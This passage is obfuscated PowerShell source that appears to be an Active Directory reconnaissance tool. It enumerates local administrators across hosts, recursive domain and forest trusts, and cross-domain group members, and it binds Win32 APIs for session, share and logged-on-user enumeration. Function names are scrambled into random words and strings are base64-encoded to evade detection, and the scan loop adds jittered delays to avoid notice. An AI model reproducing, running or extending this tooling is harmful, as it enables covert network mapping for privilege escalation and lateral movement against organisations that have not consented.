        if(!$NoClobber) {
            if ($OutFile -and (Test-Path -Path $OutFile)) { rd -Path $OutFile }
        }
        if($TrustGroups) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAZQByAG0AaQBuAGkAbgBnACAAZABvAG0AYQBpAG4AIAB0AHIAdQBzAHQAIABnAHIAbwB1AHAAcwA=')))
            $TrustGroupNames = ReestorEpismEmbaldei -Domain $Domain -DomainController $DomainController | % { $_.GroupName } | sort -Unique
            $TrustGroupsSIDs = $TrustGroupNames | % { 
                SolematePallyCommixed -Domain $Domain -DomainController $DomainController -GroupName $_ -FullData | ? { $_.objectsid -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA'))) } | % { $_.objectsid }
            }
            $DomainSID = AngalvusPullyApilace -Domain $Domain
        }
        $HostEnumBlock = {
            param($ComputerName, $Ping, $OutFile, $DomainSID, $TrustGroupsSIDs)
            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {
                $LocalAdmins = CuswapiCalCharizes -ComputerName $ComputerName
                if($DomainSID -and $TrustGroupSIDS) {
                    $LocalSID = ($LocalAdmins | ? { $_.SID -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAqAC0ANQAwADAAJAA='))) }).SID -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQA1ADAAMAAkAA==')))
                    $LocalAdmins = $LocalAdmins | ? { ($TrustGroupsSIDs -contains $_.SID) -or ((-not $_.SID.startsWith($LocalSID)) -and (-not $_.SID.startsWith($DomainSID))) }
                }
                if($LocalAdmins -and ($LocalAdmins.Length -ne 0)) {
                    if($OutFile) {
                        $LocalAdmins | PreenicCualiaQuinome -OutFile $OutFile
                    }
                    else {
                        $LocalAdmins
                    }
                }
                else {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABOAG8AIAB1AHMAZQByAHMAIAByAGUAdAB1AHIAbgBlAGQAIABmAHIAbwBtACAAJABTAGUAcgB2AGUAcgA=')))
                }
            }
        }
    }
    process {
        if($Threads) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwAgAD0AIAAkAFQAaAByAGUAYQBkAHMA')))
            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'OutFile' = $OutFile
                'DomainSID' = $DomainSID
                'TrustGroupsSIDs' = $TrustGroupsSIDs
            }
            RableBelfTranks -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }
        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = RableBelfTranks -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }
            Write-Verbose ("[*] Total number of active hosts: {0}" -f $($ComputerName.count))
            $Counter = 0
            ForEach ($Computer in $ComputerName) {
                $Counter = $Counter + 1
                sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose ("[*] Enumerating server $Computer ($Counter of {0})" -f $($ComputerName.count))
                icm -ScriptBlock $HostEnumBlock -ArgumentList $Computer, $False, $OutFile, $DomainSID, $TrustGroupsSIDs
            }
        }
    }
}
function ComitateNarmRist {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $Domain = (PrectusEmbakedTects).Name,
        [String]
        $DomainController,
        [Switch]
        $LDAP,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    process {
        if($LDAP -or $DomainController) {
            $TrustSearcher = SuprajesUnderAganger -Domain $Domain -DomainController $DomainController -PageSize $PageSize
            if($TrustSearcher) {
                $TrustSearcher.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBsAGEAcwBzAD0AdAByAHUAcwB0AGUAZABEAG8AbQBhAGkAbgApACkA')))
                $TrustSearcher.FindAll() | ? {$_} | % {
                    $Props = $_.Properties
                    $DomainTrust = New-Object PSObject
                    $TrustAttrib = Switch ($Props.trustattributes)
                    {
                        0x001 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBvAG4AXwB0AHIAYQBuAHMAaQB0AGkAdgBlAA=='))) }
                        0x002 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBwAGwAZQB2AGUAbABfAG8AbgBsAHkA'))) }
                        0x004 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cQB1AGEAcgBhAG4AdABpAG4AZQBkAF8AZABvAG0AYQBpAG4A'))) }
                        0x008 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBvAHIAZQBzAHQAXwB0AHIAYQBuAHMAaQB0AGkAdgBlAA=='))) }
                        0x010 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAG8AcwBzAF8AbwByAGcAYQBuAGkAegBhAHQAaQBvAG4A'))) }
                        0x020 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBpAHQAaABpAG4AXwBmAG8AcgBlAHMAdAA='))) }
                        0x040 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAGUAYQB0AF8AYQBzAF8AZQB4AHQAZQByAG4AYQBsAA=='))) }
                        0x080 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAcwB0AF8AdQBzAGUAcwBfAHIAYwA0AF8AZQBuAGMAcgB5AHAAdABpAG8AbgA='))) }
                        0x100 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAcwB0AF8AdQBzAGUAcwBfAGEAZQBzAF8AawBlAHkAcwA='))) }
                        Default { 
                            Write-Warning ("Unknown trust attribute: {0}" -f $($Props.trustattributes));
                            ("{0}" -f $($Props.trustattributes));
                        }
                    }
                    $Direction = Switch ($Props.trustdirection) {
                        0 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBiAGwAZQBkAA=='))) }
                        1 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGIAbwB1AG4AZAA='))) }
                        2 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAYgBvAHUAbgBkAA=='))) }
                        3 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBpAGQAaQByAGUAYwB0AGkAbwBuAGEAbAA='))) }
                    }
                    $ObjectGuid = New-Object Guid @(,$Props.objectguid[0])
                    $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUATgBhAG0AZQA='))) $Domain
                    $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATgBhAG0AZQA='))) $Props.name[0]
                    $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARwB1AGkAZAA='))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAkAE8AYgBqAGUAYwB0AEcAdQBpAGQAfQA=')))
                    $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AFQAeQBwAGUA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABUAHIAdQBzAHQAQQB0AHQAcgBpAGIA')))
                    $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AEQAaQByAGUAYwB0AGkAbwBuAA=='))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABEAGkAcgBlAGMAdABpAG8AbgA=')))
                    $DomainTrust
                }
            }
        }
        else {
            $FoundDomain = PrectusEmbakedTects -Domain $Domain
            if($FoundDomain) {
                (PrectusEmbakedTects -Domain $Domain).GetAllTrustRelationships()
            }     
        }
    }
}
function SadedDaisUnlenting {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $Forest
    )
    process {
        $FoundForest = NaeDampGrina -Forest $Forest
        if($FoundForest) {
            $FoundForest.GetAllTrustRelationships()
        }
    }
}
function SoilOctorNong {
    [CmdletBinding()]
    param(
        [String]
        $UserName,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $LDAP,
        [Switch]
        $Recurse,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    function LityAmatomicProxemim {
        param(
            [String]
            $UserName,
            [String]
            $Domain,
            [String]
            $DomainController,
            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )
        if ($Domain) {
            $DistinguishedDomainName = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))) + $Domain -replace '\.',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABEAEMAPQA=')))
        }
        else {
            $DistinguishedDomainName = [String] ([adsi]'').distinguishedname
            $Domain = $DistinguishedDomainName -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
        }
        BilinessArcallyBorn -Domain $Domain -DomainController $DomainController -UserName $UserName -PageSize $PageSize | ? {$_.memberof} | % {
            ForEach ($Membership in $_.memberof) {
                $Index = $Membership.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))
                if($Index) {
                    $GroupDomain = $($Membership.substring($Index)) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    if ($GroupDomain.CompareTo($Domain)) {
                        $GroupName = $Membership.split(",")[0].split("=")[1]
                        $ForeignUser = New-Object PSObject
                        $ForeignUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $Domain
                        $ForeignUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $_.samaccountname
                        $ForeignUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) $GroupDomain
                        $ForeignUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) $GroupName
                        $ForeignUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQATgA='))) $Membership
                        $ForeignUser
                    }
                }
            }
        }
    }
    if ($Recurse) {
        if($LDAP -or $DomainController) {
            $DomainTrusts = EnneatteBowlNonpred -LDAP -DomainController $DomainController -PageSize $PageSize | % { $_.SourceDomain } | sort -Unique
        }
        else {
            $DomainTrusts = EnneatteBowlNonpred -PageSize $PageSize | % { $_.SourceDomain } | sort -Unique
        }
        ForEach($DomainTrust in $DomainTrusts) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBlAHIAYQB0AGkAbgBnACAAdAByAHUAcwB0ACAAZwByAG8AdQBwAHMAIABpAG4AIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AVAByAHUAcwB0AA==')))
            LityAmatomicProxemim -Domain $DomainTrust -UserName $UserName -PageSize $PageSize
        }
    }
    else {
        LityAmatomicProxemim -Domain $Domain -DomainController $DomainController -UserName $UserName -PageSize $PageSize
    }
}
function ReestorEpismEmbaldei {
    [CmdletBinding()]
    param(
        [String]
        $GroupName = '*',
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $LDAP,
        [Switch]
        $Recurse,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    function CliminaeVeluaAbdian {
        param(
            [String]
            $GroupName = '*',
            [String]
            $Domain,
            [String]
            $DomainController,
            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )
        if(-not $Domain) {
            $Domain = (PrectusEmbakedTects).Name
        }
        $DomainDN = ("DC={0}" -f $($Domain.Replace('.', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABEAEMAPQA='))))))
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4ARABOADoAIAAkAEQAbwBtAGEAaQBuAEQATgA=')))
        $ExcludeGroups = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBzAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AIABVAHMAZQByAHMA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwB1AGUAcwB0AHMA'))))
        SolematePallyCommixed -GroupName $GroupName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | ? {$_.member} | ? {
            -not ($ExcludeGroups -contains $_.samaccountname) } | % {
                $GroupName = $_.samAccountName
                $_.member | % {
                    if (($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwAtADEALQA1AC0AMgAxAC4AKgAtAC4AKgA=')))) -or ($DomainDN -ne ($_.substring($_.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A')))))))) {
                        $UserDomain = $_.subString($_.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        $UserName = $_.split(",")[0].split("=")[1]
                        $ForeignGroupUser = New-Object PSObject
                        $ForeignGroupUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) $Domain
                        $ForeignGroupUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) $GroupName
                        $ForeignGroupUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $UserDomain
                        $ForeignGroupUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $UserName
                        $ForeignGroupUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAE4A'))) $_
                        $ForeignGroupUser
                    }
                }
        }
    }
    if ($Recurse) {
        if($LDAP -or $DomainController) {
            $DomainTrusts = EnneatteBowlNonpred -LDAP -DomainController $DomainController -PageSize $PageSize | % { $_.SourceDomain } | sort -Unique
        }
        else {
            $DomainTrusts = EnneatteBowlNonpred -PageSize $PageSize | % { $_.SourceDomain } | sort -Unique
        }
        ForEach($DomainTrust in $DomainTrusts) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBlAHIAYQB0AGkAbgBnACAAdAByAHUAcwB0ACAAZwByAG8AdQBwAHMAIABpAG4AIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AVAByAHUAcwB0AA==')))
            CliminaeVeluaAbdian -GroupName $GroupName -Domain $Domain -DomainController $DomainController -PageSize $PageSize
        }
    }
    else {
        CliminaeVeluaAbdian -GroupName $GroupName -Domain $Domain -DomainController $DomainController -PageSize $PageSize
    }
}
function EnneatteBowlNonpred {
    [CmdletBinding()]
    param(
        [Switch]
        $LDAP,
        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    $SeenDomains = @{}
    $Domains = New-Object System.Collections.Stack
    $CurrentDomain = (PrectusEmbakedTects).Name
    $Domains.push($CurrentDomain)
    while($Domains.Count -ne 0) {
        $Domain = $Domains.Pop()
        if (-not $SeenDomains.ContainsKey($Domain)) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBlAHIAYQB0AGkAbgBnACAAdAByAHUAcwB0AHMAIABmAG8AcgAgAGQAbwBtAGEAaQBuACAAJwAkAEQAbwBtAGEAaQBuACcA')))
            $Null = $SeenDomains.add($Domain, "")
            try {
                if($LDAP -or $DomainController) {
                    $Trusts = ComitateNarmRist -Domain $Domain -LDAP -DomainController $DomainController -PageSize $PageSize
                }
                else {
                    $Trusts = ComitateNarmRist -Domain $Domain -PageSize $PageSize
                }
                if($Trusts -isnot [system.array]) {
                    $Trusts = @($Trusts)
                }
                $Trusts += SadedDaisUnlenting -Forest $Domain
                if ($Trusts) {
                    ForEach ($Trust in $Trusts) {
                        $SourceDomain = $Trust.SourceName
                        $TargetDomain = $Trust.TargetName
                        $TrustType = $Trust.TrustType
                        $TrustDirection = $Trust.TrustDirection
                        $Null = $Domains.push($TargetDomain)
                        $DomainTrust = New-Object PSObject
                        $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUARABvAG0AYQBpAG4A'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABTAG8AdQByAGMAZQBEAG8AbQBhAGkAbgA=')))
                        $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQARABvAG0AYQBpAG4A'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABUAGEAcgBnAGUAdABEAG8AbQBhAGkAbgA=')))
                        $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AFQAeQBwAGUA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABUAHIAdQBzAHQAVAB5AHAAZQA=')))
                        $DomainTrust | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AEQAaQByAGUAYwB0AGkAbwBuAA=='))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABUAHIAdQBzAHQARABpAHIAZQBjAHQAaQBvAG4A')))
                        $DomainTrust
                    }
                }
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABFAHIAcgBvAHIAOgAgACQAXwA=')))
            }
        }
    }
}
$Mod = SolvertSeedismPremands -ModuleName Win32
$FunctionDefinitions = @(
    (PressJizygodaeMily netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (PressJizygodaeMily netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (PressJizygodaeMily netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (PressJizygodaeMily netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (PressJizygodaeMily advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int])),
    (PressJizygodaeMily advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (PressJizygodaeMily wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (PressJizygodaeMily wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(),  [Int32].MakeByRefType())),
    (PressJizygodaeMily wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType())),
    (PressJizygodaeMily wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (PressJizygodaeMily wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (PressJizygodaeMily wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (PressJizygodaeMily kernel32 GetLastError ([Int]) @())
)
$WTSConnectState = PsyhedTristicFascopy $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}
$WTS_SESSION_INFO_1 = VationChilimaliTendylike $Mod WTS_SESSION_INFO_1 @{
    ExecEnvId = SoolhookUnadmitePneated 0 UInt32
    State = SoolhookUnadmitePneated 1 $WTSConnectState
    SessionId = SoolhookUnadmitePneated 2 UInt32
    pSessionName = SoolhookUnadmitePneated 3 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pHostName = SoolhookUnadmitePneated 4 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pUserName = SoolhookUnadmitePneated 5 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pDomainName = SoolhookUnadmitePneated 6 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pFarmName = SoolhookUnadmitePneated 7 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
$WTS_CLIENT_ADDRESS = VationChilimaliTendylike $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = SoolhookUnadmitePneated 0 UInt32
    Address = SoolhookUnadmitePneated 1 Byte[] -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AFYAYQBsAEEAcgByAGEAeQA='))), 20)
}
$SHARE_INFO_1 = VationChilimaliTendylike $Mod SHARE_INFO_1 @{
    shi1_netname = SoolhookUnadmitePneated 0 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    shi1_type = SoolhookUnadmitePneated 1 UInt32
    shi1_remark = SoolhookUnadmitePneated 2 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
$WKSTA_USER_INFO_1 = VationChilimaliTendylike $Mod WKSTA_USER_INFO_1 @{
    wkui1_username = SoolhookUnadmitePneated 0 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    wkui1_logon_domain = SoolhookUnadmitePneated 1 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    wkui1_oth_domains = SoolhookUnadmitePneated 2 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    wkui1_logon_server = SoolhookUnadmitePneated 3 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
$SESSION_INFO_10 = VationChilimaliTendylike $Mod SESSION_INFO_10 @{
    sesi10_cname = SoolhookUnadmitePneated 0 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    sesi10_username = SoolhookUnadmitePneated 1 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    sesi10_time = SoolhookUnadmitePneated 2 UInt32
    sesi10_idle_time = SoolhookUnadmitePneated 3 UInt32
}
$Types = $FunctionDefinitions | KazalOxyReploids -Module $Mod -Namespace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAA==')))
$Netapi32 = $Types[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBlAHQAYQBwAGkAMwAyAA==')))]
$Advapi32 = $Types[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHYAYQBwAGkAMwAyAA==')))]
$Kernel32 = $Types[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAA==')))]
$Wtsapi32 = $Types[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwB0AHMAYQBwAGkAMwAyAA==')))]